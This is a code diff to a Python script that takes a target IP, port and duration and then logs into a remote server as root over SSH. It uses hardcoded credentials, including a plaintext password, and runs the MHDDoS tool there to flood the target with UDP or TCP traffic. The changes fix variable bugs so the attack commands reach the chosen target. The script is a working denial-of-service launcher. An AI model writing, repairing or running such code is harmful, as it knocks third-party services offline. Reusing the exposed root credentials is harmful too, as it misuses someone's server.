@@ -4,7 +4,7 @@
 import requests
 import socket
 #import socks
-#import time
+import time
 #import random
 #import threading
 import sys
@@ -75,7 +75,7 @@ if layer4input == "UDP":
     client = paramiko.client.SSHClient()
     client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
     client.connect(host1, port=port1, username=username1, password=password1)
-    _stdin, _stdout,_stderr = client.exec_command("cd root && cd MHDDoS && python3 start.py UDP " + ipudp + ":" + port1 + " 900 " + timeudp)
+    _stdin, _stdout,_stderr = client.exec_command("cd root && cd MHDDoS && python3 start.py UDP " + ipudp + ":" + portudp + " 900 " + timeudp)
     print(_stdout.read().decode())
     time.sleep(5)
     _stdin.close()
@@ -86,7 +86,6 @@ if layer4input == "TCP":
     porttcp = input(f"port ══ ")
     threadstcp = input(f"threads ══ ")
     timetcp = input(f"time ══ ")
-
     host2 = "ssh.surf"
     username2 = "root"
     password2 = "gaaBmc87Yw"
@@ -94,7 +93,7 @@ if layer4input == "TCP":
     client = paramiko.client.SSHClient()
     client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
     client.connect(host2, port=port2, username=username2, password=password2)
-    _stdin, _stdout,_stderr = client.exec_command("cd root && cd MHDDoS && python3 start.py TCP " + ipudp + ":" + port1 + " 900 " + timeudp)
+    _stdin, _stdout,_stderr = client.exec_command("cd root && cd MHDDoS && python3 start.py TCP " + iptcp + ":" + porttcp + " 900 " + timetcp)
     print(_stdout.read().decode())
     time.sleep(5)
     _stdin.close()
